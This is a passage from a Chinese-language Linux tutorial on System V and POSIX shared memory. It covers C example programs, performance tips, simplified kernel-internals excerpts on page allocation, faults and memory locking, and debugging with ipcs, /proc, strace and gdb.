    semid = semget(SHM_KEY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (semid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"semget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 2. 获取共享内存</span>
    shmid = shmget(SHM_KEY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shmget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 附加共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == (<span class="hljs-type">char</span> *)<span class="hljs-number">-1</span>) {
        perror(<span class="hljs-string">"shmat"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 4. 读取数据</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data read: %s\n"</span>, shm_addr);
    
    <span class="hljs-comment">// 5. 分离共享内存</span>
    shmdt(shm_addr);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-22">5.2 POSIX 共享内存示例</h3>
<p><strong>创建共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_NAME <span class="hljs-string">"/my_shm"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shm_fd;
    <span class="hljs-type">char</span> *shm_addr;
    
    <span class="hljs-comment">// 1. 创建共享内存对象</span>
    shm_fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, <span class="hljs-number">0666</span>);
    <span class="hljs-keyword">if</span> (shm_fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shm_open"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 2. 设置共享内存大小</span>
    <span class="hljs-keyword">if</span> (ftruncate(shm_fd, SHM_SIZE) &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"ftruncate"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 映射共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, SHM_SIZE, PROT_READ | PROT_WRITE,
                            MAP_SHARED, shm_fd, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == MAP_FAILED) {
        perror(<span class="hljs-string">"mmap"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 4. 关闭文件描述符（不影响映射）</span>
    close(shm_fd);
    
    <span class="hljs-comment">// 5. 写入数据</span>
    <span class="hljs-built_in">strcpy</span>(shm_addr, <span class="hljs-string">"Hello, POSIX Shared Memory!"</span>);
    
    <span class="hljs-comment">// 6. 等待其他进程读取</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data written. Waiting for reader...\n"</span>);
    sleep(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// 7. 取消映射</span>
    munmap(shm_addr, SHM_SIZE);
    
    <span class="hljs-comment">// 8. 删除共享内存对象</span>
    shm_unlink(SHM_NAME);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>读取共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_NAME <span class="hljs-string">"/my_shm"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shm_fd;
    <span class="hljs-type">char</span> *shm_addr;
    
    <span class="hljs-comment">// 1. 打开共享内存对象</span>
    shm_fd = shm_open(SHM_NAME, O_RDONLY, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shm_open"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 2. 映射共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, SHM_SIZE, PROT_READ,
                            MAP_SHARED, shm_fd, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == MAP_FAILED) {
        perror(<span class="hljs-string">"mmap"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 关闭文件描述符</span>
    close(shm_fd);
    
    <span class="hljs-comment">// 4. 读取数据</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data read: %s\n"</span>, shm_addr);
    
    <span class="hljs-comment">// 5. 取消映射</span>
    munmap(shm_addr, SHM_SIZE);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-23">6. 性能优化和最佳实践</h2>
<h3 data-id="heading-24">6.1 性能优化</h3>
<p><strong>1. 页面大小对齐</strong>：</p>
<p>共享内存段的大小应该对齐到页面大小（通常 4KB）：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span>
<span class="hljs-type">size_t</span> shm_size = (data_size + PAGE_SIZE - <span class="hljs-number">1</span>) &amp; ~(PAGE_SIZE - <span class="hljs-number">1</span>);
</code></pre>
<p><strong>2. 避免频繁映射/取消映射</strong>：</p>
<p>映射和取消映射有开销，应该保持映射直到不再需要：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 不好的做法</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-type">void</span> *addr = shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
    <span class="hljs-comment">// 使用共享内存</span>
    shmdt(addr);
}

<span class="hljs-comment">// 好的做法</span>
<span class="hljs-type">void</span> *addr = shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-comment">// 使用共享内存</span>
}
shmdt(addr);
</code></pre>
<p><strong>3. 使用大页面</strong>：</p>
<p>对于大块共享内存，可以使用大页面（Huge Pages）提高性能：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 创建大页面共享内存</span>
shmid = shmget(key, size, IPC_CREAT | SHM_HUGETLB | <span class="hljs-number">0666</span>);
</code></pre>
<h3 data-id="heading-25">6.2 最佳实践</h3>
<p><strong>1. 错误处理</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> shmid = shmget(key, size, IPC_CREAT | <span class="hljs-number">0666</span>);
<span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmget"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-type">void</span> *addr = shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (addr == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) {
    perror(<span class="hljs-string">"shmat"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p><strong>2. 清理资源</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 分离共享内存</span>
<span class="hljs-keyword">if</span> (shmdt(addr) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmdt"</span>);
}

<span class="hljs-comment">// 删除共享内存（最后一个进程）</span>
<span class="hljs-keyword">if</span> (shmctl(shmid, IPC_RMID, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
}
</code></pre>
<p><strong>3. 使用同步机制</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 使用互斥锁保护共享内存访问</span>
pthread_mutex_lock(mutex);
<span class="hljs-comment">// 访问共享内存</span>
pthread_mutex_unlock(mutex);
</code></pre>
<p><strong>4. 检查共享内存状态</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span> <span class="hljs-title">buf</span>;</span>
<span class="hljs-keyword">if</span> (shmctl(shmid, IPC_STAT, &amp;buf) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: %lu\n"</span>, buf.shm_segsz);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Attached: %lu\n"</span>, buf.shm_nattch);
</code></pre>
<hr/>
<h2 data-id="heading-26">7. 底层实现细节</h2>
<h3 data-id="heading-27">7.1 tmpfs 文件系统</h3>
<p><strong>tmpfs 的挂载</strong>：</p>
<p>System V 共享内存使用的 tmpfs 文件系统在内核启动时挂载：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vfsmount</span> *<span class="hljs-title">shm_mnt</span>;</span>

<span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">init_tmpfs</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// 注册 tmpfs 文件系统</span>
    register_filesystem(&amp;tmpfs_fs_type);
    
    <span class="hljs-comment">// 挂载 tmpfs</span>
    shm_mnt = kern_mount(&amp;tmpfs_fs_type);
    <span class="hljs-keyword">if</span> (IS_ERR(shm_mnt)) {
        pr_err(<span class="hljs-string">"Could not kern_mount tmpfs\n"</span>);
        <span class="hljs-keyword">return</span> PTR_ERR(shm_mnt);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>tmpfs 的特点</strong>：</p>
<ol>
<li><strong>内存存储</strong>：所有数据存储在 RAM 中</li>
<li><strong>可交换</strong>：如果内存不足，可以交换到交换分区</li>
<li><strong>动态大小</strong>：可以根据需要动态增长</li>
<li><strong>临时性</strong>：系统重启后数据丢失</li>
</ol>
<h3 data-id="heading-28">7.2 页面分配机制</h3>
<p><strong>延迟分配（Lazy Allocation）</strong>：</p>
<p>共享内存段创建时，并不立即分配所有页面，而是采用延迟分配策略：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shmem_getpage_gfp</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-type">pgoff_t</span> index,
                              <span class="hljs-keyword">struct</span> page **pagep, <span class="hljs-keyword">enum</span> sgp_type sgp,
                              <span class="hljs-type">gfp_t</span> gfp, <span class="hljs-keyword">struct</span> vm_area_struct *vma,
                              <span class="hljs-keyword">struct</span> vm_fault *vmf, <span class="hljs-type">vm_fault_t</span> *fault_type)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span> =</span> inode-&gt;i_mapping;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmem_inode_info</span> *<span class="hljs-title">info</span> =</span> SHMEM_I(inode);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span>
    <span class="hljs-type">swp_entry_t</span> swap;
    <span class="hljs-type">int</span> error;
    
    <span class="hljs-comment">// 1. 查找页面是否已存在</span>
    page = find_get_entry(mapping, index);
    <span class="hljs-keyword">if</span> (page &amp;&amp; !xa_is_value(page)) {
        <span class="hljs-comment">// 页面已存在</span>
        *pagep = page;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">// 2. 检查是否在交换分区</span>
    swap = shmem_get_swap(info, index);
    <span class="hljs-keyword">if</span> (swap.val) {
        <span class="hljs-comment">// 从交换分区换入</span>
        error = shmem_swapin_page(inode, index, &amp;page, sgp, gfp, vma, fault_type);
        <span class="hljs-keyword">if</span> (error)
            <span class="hljs-keyword">return</span> error;
        *pagep = page;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">// 3. 分配新页面</span>
    page = shmem_alloc_and_acct_page(gfp, info, sgp, index);
    <span class="hljs-keyword">if</span> (IS_ERR(page))
        <span class="hljs-keyword">return</span> PTR_ERR(page);
    
    <span class="hljs-comment">// 4. 添加到地址空间</span>
    error = shmem_add_to_page_cache(page, mapping, index, gfp, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (error) {
        __free_page(page);
        <span class="hljs-keyword">return</span> error;
    }
    
    *pagep = page;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>延迟分配</strong>：页面在首次访问时才分配</li>
<li><strong>交换支持</strong>：如果页面在交换分区，需要换入</li>
<li><strong>缓存管理</strong>：使用地址空间（address_space）管理页面</li>
</ol>
<h3 data-id="heading-29">7.3 页面错误处理</h3>
<p><strong>页面错误的触发</strong>：</p>
<p>当进程访问共享内存时，如果页面不在内存中，会触发页面错误：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/memory.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-type">pte_t</span> entry;
    
    <span class="hljs-keyword">if</span> (!vmf-&gt;pte) {
        <span class="hljs-comment">// 页表项不存在，需要分配</span>
        <span class="hljs-keyword">return</span> do_fault(vmf);
    }
    
    entry = ptep_get(vmf-&gt;pte);
    <span class="hljs-keyword">if</span> (!pte_present(entry)) {
        <span class="hljs-comment">// 页面不在内存中</span>
        <span class="hljs-keyword">if</span> (pte_none(entry))
            <span class="hljs-keyword">return</span> do_fault(vmf);
        <span class="hljs-keyword">if</span> (pte_swp_swap_required(entry))
            <span class="hljs-keyword">return</span> do_swap_page(vmf);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>shmem_fault() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">shmem_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(vma-&gt;vm_file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span>
    <span class="hljs-type">vm_fault_t</span> ret = VM_FAULT_LOCKED;
    <span class="hljs-type">int</span> error;
    
    <span class="hljs-comment">// 1. 获取页面</span>
    error = shmem_getpage_gfp(inode, vmf-&gt;pgoff, &amp;page,
                              SGP_CACHE, vmf-&gt;gfp_mask, vma, vmf, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (error)
        <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;
    
    <span class="hljs-comment">// 2. 如果页面在交换分区，需要换入</span>
    <span class="hljs-keyword">if</span> (PageSwapCache(page)) {
        swap_readpage(page, <span class="hljs-literal">true</span>);
        wait_on_page_locked(page);
        <span class="hljs-keyword">if</span> (!PageUptodate(page)) {
            unlock_page(page);
            put_page(page);
            <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;
        }
    }
    
    <span class="hljs-comment">// 3. 设置页表项</span>
    vmf-&gt;page = page;
    <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<p><strong>关键步骤</strong>：</p>
<ol>
<li><strong>查找页面</strong>：在地址空间中查找页面</li>
<li><strong>交换处理</strong>：如果页面在交换分区，需要换入</li>
<li><strong>分配页面</strong>：如果页面不存在，分配新页面</li>
<li><strong>设置页表</strong>：将页面映射到进程地址空间</li>
</ol>
<h3 data-id="heading-30">7.4 写时复制（Copy-on-Write）</h3>
<p><strong>MAP_PRIVATE vs MAP_SHARED</strong>：</p>
<ul>
<li><strong>MAP_SHARED</strong>：多个进程共享同一物理页面，一个进程的修改对其他进程可见</li>
<li><strong>MAP_PRIVATE</strong>：每个进程有独立的页面副本，使用写时复制</li>
</ul>
<p><strong>写时复制机制</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/memory.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">do_wp_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">old_page</span> =</span> vmf-&gt;page;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">new_page</span>;</span>
    
    <span class="hljs-comment">// 1. 检查是否允许写时复制</span>
    <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE))
        <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;
    
    <span class="hljs-comment">// 2. 分配新页面</span>
    new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, vmf-&gt;address);
    <span class="hljs-keyword">if</span> (!new_page)
        <span class="hljs-keyword">return</span> VM_FAULT_OOM;
    
    <span class="hljs-comment">// 3. 复制页面内容</span>
    copy_user_highpage(new_page, old_page, vmf-&gt;address, vma);
    
    <span class="hljs-comment">// 4. 设置页表项</span>
    <span class="hljs-type">pte_t</span> entry = mk_pte(new_page, vma-&gt;vm_page_prot);
    entry = maybe_mkwrite(pte_mkdirty(entry), vma);
    set_pte_at(vma-&gt;vm_mm, vmf-&gt;address, vmf-&gt;pte, entry);
    
    <span class="hljs-comment">// 5. 更新统计</span>
    update_mmu_cache(vma, vmf-&gt;address, vmf-&gt;pte);
    
    <span class="hljs-keyword">return</span> VM_FAULT_WRITE;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>共享内存使用 MAP_SHARED</strong>：所有进程共享同一物理页面</li>
<li><strong>写时复制用于 MAP_PRIVATE</strong>：私有映射使用写时复制</li>
<li><strong>性能考虑</strong>：写时复制可以减少内存使用，但首次写入时有开销</li>
</ol>
<h3 data-id="heading-31">7.5 内存锁定（Memory Locking）</h3>
<p><strong>SHM_LOCK 的作用</strong>：</p>
<p>锁定共享内存段，防止其被交换到磁盘。</p>
<p><strong>实现原理</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shmctl_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipc_namespace *ns, <span class="hljs-type">int</span> shmid)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">shm_file</span>;</span>
    <span class="hljs-type">int</span> err;
    
    shp = shm_lock(ns, shmid);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 1. 检查权限</span>
    <span class="hljs-keyword">if</span> (!ns_capable(ns-&gt;user_ns, CAP_IPC_LOCK)) {
        shm_unlock(shp);
        <span class="hljs-keyword">return</span> -EPERM;
    }
    
    <span class="hljs-comment">// 2. 锁定文件</span>
    shm_file = shp-&gt;shm_file;
    <span class="hljs-keyword">if</span> (is_file_hugepages(shm_file))
        err = mlock_hugepage(shm_file);
    <span class="hljs-keyword">else</span>
        err = shmem_lock(shm_file, <span class="hljs-number">1</span>, shp-&gt;mlock_ucounts);
    
    <span class="hljs-keyword">if</span> (!err &amp;&amp; !(shp-&gt;shm_perm.mode &amp; SHM_LOCKED)) {
        shp-&gt;shm_perm.mode |= SHM_LOCKED;
        shp-&gt;mlock_ucounts = get_ucounts(current_ucounts());
    }
    
    shm_unlock(shp);
    <span class="hljs-keyword">return</span> err;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>防止交换</strong>：锁定的内存不会被交换到磁盘</li>
<li><strong>权限要求</strong>：需要 <code>CAP_IPC_LOCK</code> 权限</li>
<li><strong>资源限制</strong>：受 <code>RLIMIT_MEMLOCK</code> 限制</li>
</ol>
<hr/>
<h2 data-id="heading-32">8. 故障排查和调试</h2>
<h3 data-id="heading-33">8.1 查看共享内存状态</h3>
<p><strong>使用 ipcs 命令</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有共享内存段</span>
ipcs -m

<span class="hljs-comment"># 查看详细信息</span>
ipcs -m -l

<span class="hljs-comment"># 查看特定进程的共享内存</span>
ipcs -m -p
</code></pre>
<p><strong>使用 /proc 文件系统</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看进程的共享内存映射</span>
<span class="hljs-built_in">cat</span> /proc/&lt;pid&gt;/maps | grep shm

<span class="hljs-comment"># 查看共享内存统计</span>
<span class="hljs-built_in">cat</span> /proc/sysvipc/shm
</code></pre>
<h3 data-id="heading-34">8.2 常见问题</h3>
<p><strong>1. 共享内存段已存在</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 错误处理</span>
<span class="hljs-type">int</span> shmid = shmget(key, size, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0666</span>);
<span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">if</span> (errno == EEXIST) {
        <span class="hljs-comment">// 共享内存段已存在，获取它</span>
        shmid = shmget(key, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    } <span class="hljs-keyword">else</span> {
        perror(<span class="hljs-string">"shmget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
}
</code></pre>
<p><strong>2. 权限不足</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 检查权限</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span> <span class="hljs-title">buf</span>;</span>
<span class="hljs-keyword">if</span> (shmctl(shmid, IPC_STAT, &amp;buf) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// 检查是否有读权限</span>
<span class="hljs-keyword">if</span> (!(buf.shm_perm.mode &amp; S_IRUSR)) {
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"No read permission\n"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p><strong>3. 内存不足</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 检查系统限制</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shminfo</span> <span class="hljs-title">info</span>;</span>
<span class="hljs-keyword">if</span> (shmctl(<span class="hljs-number">0</span>, IPC_INFO, (<span class="hljs-keyword">struct</span> shmid_ds *)&amp;info) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Max size: %lu\n"</span>, info.shmmax);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Total segments: %lu\n"</span>, info.shmmni);
</code></pre>
<h3 data-id="heading-35">8.3 调试技巧</h3>
<p><strong>1. 使用 strace 跟踪系统调用</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">strace -e trace=shmget,shmat,shmdt,shmctl ./program
</code></pre>
<p><strong>2. 使用 gdb 调试</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">gdb ./program
(gdb) <span class="hljs-built_in">break</span> shmat
(gdb) run
(gdb) <span class="hljs-built_in">print</span> shm_addr
</code></pre>
<p><strong>3. 检查内存泄漏</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看未删除的共享内存段</span>
ipcs -m | grep -v <span class="hljs-string">"^key"</span>

<span class="hljs-comment"># 检查进程的共享内存映射</span>
<span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> $(ps -eo pid); <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"PID: <span class="hljs-variable">$pid</span>"</span>
    <span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$pid</span>/maps | grep shm
<span class="hljs-keyword">done</span>
</code></pre>
<hr/>
<h2 data-id="heading-36">9. 性能优化</h2>
<h3 data-id="heading-37">9.1 大页面支持</h3>
<p><strong>使用大页面（Huge Pages）</strong>：</p>
<p>大页面可以减少页表项数量，提高 TLB 命中率，从而提高性能。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 创建大页面共享内存</span>
<span class="hljs-type">int</span> shmid = shmget(key, size, IPC_CREAT | SHM_HUGETLB | <span class="hljs-number">0666</span>);
</code></pre>
<p><strong>配置大页面</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看大页面信息</span>
<span class="hljs-built_in">cat</span> /proc/meminfo | grep Huge

<span class="hljs-comment"># 配置大页面数量</span>
<span class="hljs-built_in">echo</span> 10 &gt; /proc/sys/vm/nr_hugepages
</code></pre>
<h3 data-id="heading-38">9.2 内存对齐</h3>
<p><strong>页面大小对齐</strong>：</p>
<p>共享内存段的大小应该对齐到页面大小：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span>
<span class="hljs-type">size_t</span> aligned_size = (size + PAGE_SIZE - <span class="hljs-number">1</span>) &amp; ~(PAGE_SIZE - <span class="hljs-number">1</span>);
</code></pre>
<p><strong>缓存行对齐</strong>：</p>
<p>对于频繁访问的数据结构，应该对齐到缓存行大小：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_LINE_SIZE 64</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> {</span>
    <span class="hljs-type">char</span> padding[CACHE_LINE_SIZE];
    <span class="hljs-type">int</span> value;
} __attribute__((aligned(CACHE_LINE_SIZE)));
</code></pre>
<h3 data-id="heading-39">9.3 预分配页面</h3>
<p><strong>使用 mlock() 锁定内存</strong>：</p>
